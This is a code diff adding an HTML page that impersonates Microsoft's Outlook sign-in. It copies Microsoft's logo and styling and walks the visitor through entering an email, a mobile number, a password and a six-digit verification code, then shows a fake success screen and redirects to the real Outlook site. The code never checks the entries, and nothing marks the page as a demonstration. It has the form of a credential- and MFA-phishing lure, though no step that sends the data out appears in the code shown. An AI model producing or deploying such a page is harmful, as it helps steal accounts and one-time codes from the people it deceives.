@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to your Microsoft account</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; flex-direction: column; }
+    .bg-wrap { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; background: linear-gradient(135deg, #0078d4 0%, #005a9e 40%, #003f6b 100%); position: relative; overflow: hidden; }
+    .bg-wrap::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 20% 80%, rgba(255,255,255,.06) 0%, transparent 50%), radial-gradient(ellipse at 80% 20%, rgba(255,255,255,.04) 0%, transparent 50%); }
+    .card { background: #fff; border-radius: 2px; width: 100%; max-width: 440px; padding: 44px 44px 36px; position: relative; z-index: 1; box-shadow: 0 2px 6px rgba(0,0,0,.2); }
+    .ms-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; }
+    .ms-logo-text { font-size: 20px; font-weight: 600; color: #1b1b1b; letter-spacing: -.3px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; line-height: 1.2; }
+    .sub { font-size: 13px; color: #505050; margin-bottom: 24px; line-height: 1.5; }
+    .sub a { color: #0078d4; text-decoration: none; }
+    .sub a:hover { text-decoration: underline; }
+    .fg { margin-bottom: 16px; position: relative; }
+    .fg input { width: 100%; padding: 8px 0 8px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; color: #1b1b1b; outline: none; background: transparent; transition: border-color .15s; }
+    .fg input:focus { border-bottom: 2px solid #0078d4; padding-bottom: 7px; }
+    .fg label { position: absolute; top: 8px; left: 0; font-size: 15px; color: #666; pointer-events: none; transition: all .15s; }
+    .fg input:focus + label, .fg input:not(:placeholder-shown) + label { top: -14px; font-size: 12px; color: #0078d4; }
+    .fg input::placeholder { color: transparent; }
+    .fg-err { font-size: 12px; color: #a80000; margin-top: 6px; display: none; }
+    .fg-err.show { display: block; }
+    .opts { margin-bottom: 28px; }
+    .opts a { font-size: 13px; color: #0078d4; text-decoration: none; }
+    .opts a:hover { text-decoration: underline; }
+    .row { display: flex; align-items: center; justify-content: space-between; margin-top: 8px; }
+    .btn { padding: 8px 20px; background: #0078d4; color: #fff; font-size: 15px; font-weight: 600; border: none; border-radius: 2px; cursor: pointer; transition: background .15s; min-width: 108px; text-align: center; }
+    .btn:hover { background: #106ebe; }
+    .btn-ghost { padding: 8px 16px; background: transparent; color: #0078d4; font-size: 13px; border: none; cursor: pointer; font-weight: 600; }
+    .btn-ghost:hover { text-decoration: underline; }
+    .user-chip { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
+    .avatar { width: 40px; height: 40px; border-radius: 50%; background: #0078d4; color: #fff; font-size: 18px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
+    .user-email { font-size: 15px; color: #1b1b1b; font-weight: 500; }
+    .pwd-row { position: relative; }
+    .show-pwd { position: absolute; right: 0; top: 6px; background: none; border: none; color: #0078d4; font-size: 13px; cursor: pointer; font-weight: 600; }
+    .stay-in { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #1b1b1b; margin-bottom: 28px; margin-top: 20px; }
+    .stay-in input { width: 16px; height: 16px; accent-color: #0078d4; }
+    /* Authenticator step */
+    .auth-badge { display: flex; align-items: center; gap: 14px; background: #f0f7ff; border: 1px solid #c7dffa; border-radius: 4px; padding: 14px 16px; margin-bottom: 22px; }
+    .auth-icon { width: 48px; height: 48px; background: #0078d4; border-radius: 8px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .auth-text { font-size: 13px; color: #004578; line-height: 1.5; }
+    .auth-text strong { display: block; font-size: 14px; margin-bottom: 2px; }
+    .divider-or { display: flex; align-items: center; gap: 10px; font-size: 12px; color: #888; margin: 18px 0; }
+    .divider-or::before, .divider-or::after { content: ''; flex: 1; border-top: 1px solid #e0e0e0; }
+    .otp-boxes { display: flex; gap: 8px; margin-bottom: 6px; }
+    .otp-boxes input { width: 42px; height: 50px; text-align: center; font-size: 20px; font-weight: 700; border: none; border-bottom: 2px solid #666; outline: none; color: #1b1b1b; background: transparent; }
+    .otp-boxes input:focus { border-bottom-color: #0078d4; }
+    .otp-hint { font-size: 12px; color: #505050; margin-bottom: 22px; }
+    .otp-hint a { color: #0078d4; text-decoration: none; }
+    .otp-hint a:hover { text-decoration: underline; }
+    /* Granted */
+    .granted { text-align: center; padding: 10px 0 20px; }
+    .ms-check { width: 68px; height: 68px; background: #107c10; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; }
+    .granted p { font-size: 14px; color: #505050; line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 24px; background: #f0f7ff; border: 1px solid #c7dffa; border-radius: 2px; padding: 14px 16px; font-size: 13px; color: #004578; text-align: left; }
+    .redir strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 3px; background: #c7dffa; border-radius: 2px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: #0078d4; }
+    footer { background: #f2f2f2; padding: 12px 32px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
+    .flinks { display: flex; gap: 16px; flex-wrap: wrap; }
+    .flinks a { font-size: 11px; color: #666; text-decoration: none; }
+    .flinks a:hover { text-decoration: underline; }
+    .fcopy { font-size: 11px; color: #666; }
+    @media (max-width: 500px) { .card { padding: 32px 24px 28px; } footer { padding: 12px 16px; } }
+  </style>
+</head>
+<body>
+
+<div class="bg-wrap">
+  <div class="card">
+    <div class="ms-logo">
+      <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <rect x="0" y="0" width="10" height="10" fill="#f25022"/>
+        <rect x="11" y="0" width="10" height="10" fill="#7fba00"/>
+        <rect x="0" y="11" width="10" height="10" fill="#00a4ef"/>
+        <rect x="11" y="11" width="10" height="10" fill="#ffb900"/>
+      </svg>
+      <span class="ms-logo-text">Microsoft</span>
+    </div>
+
+    <!-- STEP 1: Email -->
+    <div class="step active" id="step1">
+      <h1>Sign in</h1>
+      <p class="sub">to continue to Outlook</p>
+      <div class="fg">
+        <input type="email" id="email" placeholder="email" autocomplete="email" />
+        <label for="email">Email, phone, or Skype</label>
+        <p class="fg-err" id="email-err">Enter a valid email address.</p>
+      </div>
+      <div class="fg">
+        <input type="tel" id="ms-mobile" placeholder="mobilenum" autocomplete="tel" />
+        <label for="ms-mobile">Mobile number (for verification)</label>
+        <p class="fg-err"></p>
+      </div>
+      <div class="opts"><a href="#">No account? Create one!</a></div>
+      <div class="row">
+        <a href="#" style="font-size:13px;color:#0078d4;text-decoration:none;font-weight:600;">Sign-in options</a>
+        <button class="btn" onclick="nextStep()">Next</button>
+      </div>
+    </div>
+
+    <!-- STEP 2: Password -->
+    <div class="step" id="step2">
+      <h1>Enter password</h1>
+      <div class="user-chip">
+        <div class="avatar" id="av">?</div>
+        <span class="user-email" id="disp-email"></span>
+      </div>
+      <div class="fg pwd-row">
+        <input type="password" id="pwd" placeholder="password" autocomplete="current-password" />
+        <label for="pwd">Password</label>
+        <button class="show-pwd" type="button" onclick="togglePwd(this)">Show</button>
+        <p class="fg-err" id="pwd-err">Your account or password is incorrect.</p>
+      </div>
+      <div class="opts"><a href="#">Forgot my password</a></div>
+      <label class="stay-in"><input type="checkbox" checked /> Stay signed in</label>
+      <div class="row">
+        <button class="btn-ghost" onclick="backStep(1)">Back</button>
+        <button class="btn" onclick="doPassword()">Sign in</button>
+      </div>
+    </div>
+
+    <!-- STEP 3: Microsoft Authenticator / OTP -->
+    <div class="step" id="step3">
+      <h1>Verify your identity</h1>
+      <p class="sub">Keep your account secure with an extra verification step.</p>
+
+      <div class="auth-badge">
+        <div class="auth-icon">
+          <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+            <rect x="6" y="3" width="16" height="22" rx="2" fill="white" opacity=".9"/>
+            <rect x="9" y="7" width="10" height="2" rx="1" fill="#0078d4"/>
+            <rect x="9" y="11" width="10" height="2" rx="1" fill="#0078d4"/>
+            <circle cx="14" cy="18" r="3" fill="#0078d4"/>
+          </svg>
+        </div>
+        <div class="auth-text">
+          <strong>Microsoft Authenticator app</strong>
+          Open the Authenticator app on your phone and approve the sign-in request.
+        </div>
+      </div>
+
+      <div class="divider-or">Or enter a code instead</div>
+
+      <div class="fg">
+        <label style="font-size:13px;font-weight:600;color:#1b1b1b;display:block;margin-bottom:8px;">Enter the 6-digit code sent to <span id="ms-mobile-hint">your registered number</span></label>
+        <div class="otp-boxes">
+          <input type="text" maxlength="1" class="ms-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="ms-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="ms-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="ms-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="ms-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="ms-otp" inputmode="numeric" />
+        </div>
+      </div>
+      <p class="otp-hint">Didn't get a code? <a href="#" onclick="return false;">Send again</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use a different method</a></p>
+
+      <div class="row">
+        <button class="btn-ghost" onclick="backStep(2)">Back</button>
+        <button class="btn" onclick="doVerify()">Verify</button>
+      </div>
+    </div>
+
+    <!-- STEP 4: Granted -->
+    <div class="step" id="step4">
+      <div class="granted">
+        <div class="ms-check">
+          <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+            <path d="M7 18l8 8 14-14" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <h2>Signed in successfully</h2>
+        <p>Welcome back! You are now signed in to your Microsoft account.</p>
+        <div class="redir">
+          <strong id="ctxt">Redirecting in 5 seconds</strong>
+          You will be taken to your Outlook inbox.
+          <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer>
+  <div class="flinks">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <a href="#">Accessibility</a>
+  </div>
+  <span class="fcopy">&copy; 2024 Microsoft</span>
+</footer>
+
+<script>
+  function nextStep() {
+    var em = document.getElementById('email').value.trim();
+    if (!em || !em.includes('@')) { document.getElementById('email-err').classList.add('show'); return; }
+    document.getElementById('email-err').classList.remove('show');
+    document.getElementById('av').textContent = em.charAt(0).toUpperCase();
+    document.getElementById('disp-email').textContent = em;
+    showStep(2);
+  }
+  function updateMsHint() {
+    var raw = document.getElementById('ms-mobile').value.replace(/\s/g, '');
+    var hint = raw.length >= 2 ? '●●●●' + raw.slice(-2) : (raw || 'your registered number');
+    var el = document.getElementById('ms-mobile-hint');
+    if (el) el.textContent = hint;
+  }
+  function doPassword() {
+    var pw = document.getElementById('pwd').value;
+    if (!pw) { document.getElementById('pwd-err').classList.add('show'); return; }
+    document.getElementById('pwd-err').classList.remove('show');
+    updateMsHint();
+    showStep(3);
+  }
+  function doVerify() { showStep(4); startRedirect(); }
+  function backStep(n) { showStep(n); }
+  function showStep(n) {
+    document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
+    document.getElementById('step'+n).classList.add('active');
+  }
+  function togglePwd(btn) {
+    var inp = document.getElementById('pwd');
+    if(inp.type==='password'){inp.type='text';btn.textContent='Hide';}
+    else{inp.type='password';btn.textContent='Show';}
+  }
+  function startRedirect() {
+    var s=5, fill=document.getElementById('pfill'), txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){ fill.style.width='100%'; },50);
+    var iv=setInterval(function(){
+      s--;
+      if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://outlook.live.com';},400);}
+      else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');
+    },1000);
+  }
+  var msOtp = document.querySelectorAll('.ms-otp');
+  msOtp.forEach(function(inp,i){
+    inp.addEventListener('input',function(){
+      this.value=this.value.replace(/[^0-9]/g,'');
+      if(this.value&&i<msOtp.length-1) msOtp[i+1].focus();
+    });
+    inp.addEventListener('keydown',function(e){
+      if(e.key==='Backspace'&&!this.value&&i>0) msOtp[i-1].focus();
+    });
+  });
+  document.getElementById('email').addEventListener('keydown',function(e){if(e.key==='Enter')nextStep();});
+  document.getElementById('pwd').addEventListener('keydown',function(e){if(e.key==='Enter')doPassword();});
+</script>
+</body>
+</html>
